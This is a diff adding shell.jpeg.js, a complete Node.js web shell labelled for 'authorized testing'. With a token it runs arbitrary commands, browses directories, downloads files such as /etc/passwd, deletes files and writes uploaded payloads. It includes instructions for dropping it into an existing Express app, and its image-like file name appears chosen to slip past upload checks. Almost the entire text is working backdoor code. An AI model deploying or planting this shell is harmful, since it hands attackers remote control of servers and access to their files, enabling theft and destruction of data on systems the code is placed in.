@@ -1,0 +1,169 @@
+#!/usr/bin/env node
+/**
+ * shell.jpeg.js — minimal Node.js web shell for authorized testing
+ *
+ * Standalone mode:
+ *   node shell.jpeg.js [PORT] [TOKEN]
+ *     node shell.jpeg.js 8080 N0d3Sh3ll!
+ *
+ *   GET  /?token=X&cmd=id                     -> run command
+ *   GET  /?token=X&ls=/var/www                -> directory listing
+ *   GET  /?token=X&dl=/etc/passwd             -> download file
+ *   GET  /?token=X&rm=/tmp/junk              -> delete file/dir
+ *   POST /?token=X&write=/tmp/out             -> write raw body to file
+ *        curl -X POST --data-binary @payload.js \
+ *          "http://host:8080/?token=X&write=/tmp/payload.js"
+ *
+ * Express integration (drop into an existing app):
+ *   const shell = require('/path/to/shell.jpeg.js');
+ *   app.use('/shell.jpeg.js', shell);
+ *
+ * Runs with the privileges of the user that starts node.
+ * Bind to 127.0.0.1 via SHELL_HOST for safer testing.
+ */
+
+'use strict';
+
+const http = require('http');
+const { exec } = require('child_process');
+const fs = require('fs');
+const path = require('path');
+
+const PORT = parseInt(process.argv[2], 10) || 8080;
+const TOKEN = process.argv[3] || process.env.SHELL_TOKEN || 'n0de_shell';
+const HOST = process.env.SHELL_HOST || '0.0.0.0';
+
+const esc = (s) =>
+  String(s).replace(/[&<>"']/g, (c) => (
+    { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]
+  ));
+
+function send(res, status, body, type = 'text/plain') {
+  res.writeHead(status, { 'Content-Type': `${type}; charset=utf-8` });
+  res.end(body);
+}
+
+function page(res, inner) {
+  send(
+    res,
+    200,
+    `<!doctype html><html><head><meta charset="utf-8"><title>shell</title>
+<style>
+body{font-family:monospace;margin:2em;background:#111;color:#0f0}
+input,button{background:#222;color:#0f0;border:1px solid #0f0;padding:.3em}
+pre{background:#000;padding:1em;overflow:auto;border:1px solid #333}
+a{color:#4af}
+</style></head><body>
+<h1>node shell</h1>
+<form method="get"><input type="hidden" name="token" value="${TOKEN}">
+<input type="text" name="cmd" placeholder="command" size="70" autofocus>
+<button>run</button></form>
+<form method="get"><input type="hidden" name="token" value="${TOKEN}">
+<input type="text" name="ls" placeholder="/path/to/list" size="70">
+<button>list dir</button></form>
+<input type="file" id="f"><input type="text" id="w" placeholder="/tmp/out.bin" size="50">
+<button onclick="up()">upload</button>
+<script>
+function up(){var f=document.getElementById('f').files[0],w=document.getElementById('w').value;
+fetch('/?token=${TOKEN}&write='+encodeURIComponent(w),{method:'POST',body:f})
+.then(r=>r.text()).then(t=>alert(t));}
+</script>
+<hr><div id="out">${inner}</div></body></html>`,
+    'text/html'
+  );
+}
+
+function handler(req, res) {
+  const u = new URL(req.url, 'http://local');
+  const p = u.searchParams;
+
+  if (p.get('token') !== TOKEN) return send(res, 401, 'unauthorized');
+
+  const cmd = p.get('cmd');
+  const ls = p.get('ls');
+  const dl = p.get('dl');
+  const rm = p.get('rm');
+  const write = p.get('write');
+  const cwd = p.get('cwd') || process.cwd();
+
+  // ---- raw-body file write -------------------------------------
+  if (req.method === 'POST' && write) {
+    const chunks = [];
+    req.on('data', (c) => chunks.push(c));
+    req.on('end', () => {
+      const buf = Buffer.concat(chunks);
+      fs.writeFile(write, buf, (err) => {
+        if (err) return send(res, 500, `ERR: ${err.message}`);
+        send(res, 200, `[+] wrote ${buf.length} bytes -> ${write}`);
+      });
+    });
+    return;
+  }
+
+  // ---- delete ---------------------------------------------------
+  if (rm) {
+    fs.rm(rm, { recursive: true, force: true }, (err) => {
+      if (err) return send(res, 500, `ERR: ${err.message}`);
+      send(res, 200, `[+] removed ${rm}`);
+    });
+    return;
+  }
+
+  // ---- download -------------------------------------------------
+  if (dl) {
+    fs.stat(dl, (err, st) => {
+      if (err || !st.isFile()) return send(res, 404, 'not found');
+      res.writeHead(200, {
+        'Content-Type': 'application/octet-stream',
+        'Content-Disposition': `attachment; filename="${path.basename(dl)}"`,
+        'Content-Length': st.size,
+      });
+      fs.createReadStream(dl).pipe(res);
+    });
+    return;
+  }
+
+  // ---- directory listing ----------------------------------------
+  if (ls) {
+    fs.readdir(ls, { withFileTypes: true }, (err, entries) => {
+      if (err) return send(res, 500, `ERR: ${err.message}`);
+      let out = `<h2>${esc(ls)}</h2><ul>`;
+      out += `<li><a href="?token=${TOKEN}&ls=${encodeURIComponent(path.dirname(ls))}">../</a></li>`;
+      for (const e of entries) {
+        const full = path.join(ls, e.name);
+        const q = encodeURIComponent(full);
+        out += e.isDirectory()
+          ? `<li>[d] <a href="?token=${TOKEN}&ls=${q}">${esc(e.name)}</a></li>`
+          : `<li><a href="?token=${TOKEN}&dl=${q}">${esc(e.name)}</a> ` +
+            `<a href="?token=${TOKEN}&rm=${q}" onclick="return confirm('delete?')">[x]</a></li>`;
+      }
+      out += '</ul>';
+      page(res, out);
+    });
+    return;
+  }
+
+  // ---- command execution ----------------------------------------
+  if (cmd) {
+    exec(cmd, { cwd, timeout: 15000 }, (err, stdout, stderr) => {
+      const tail = err && err.code != null ? `\n[exit ${err.code}]` : '';
+      page(res, `<h2>$ ${esc(cmd)} <small>cwd: ${esc(cwd)}</small></h2>` +
+                `<pre>${esc(stdout + stderr + tail)}</pre>`);
+    });
+    return;
+  }
+
+  // ---- default landing: whoami + pwd -----------------------------
+  exec('id; pwd; uname -a', (err, stdout, stderr) => {
+    page(res, `<h2>system info</h2><pre>${esc((stdout || '') + (stderr || '') + (err ? '\n' + err.message : ''))}</pre>`);
+  });
+}
+
+if (require.main === module) {
+  http.createServer(handler).listen(PORT, HOST, () => {
+    console.log(`[shell.jpeg.js] http://${HOST}:${PORT}/?token=${TOKEN}`);
+    console.log(`  test: curl -s "http://127.0.0.1:${PORT}/?token=${TOKEN}&cmd=id"`);
+  });
+} else {
+  module.exports = handler; // app.use('/shell.jpeg.js', require('./shell.jpeg.js'))
+}
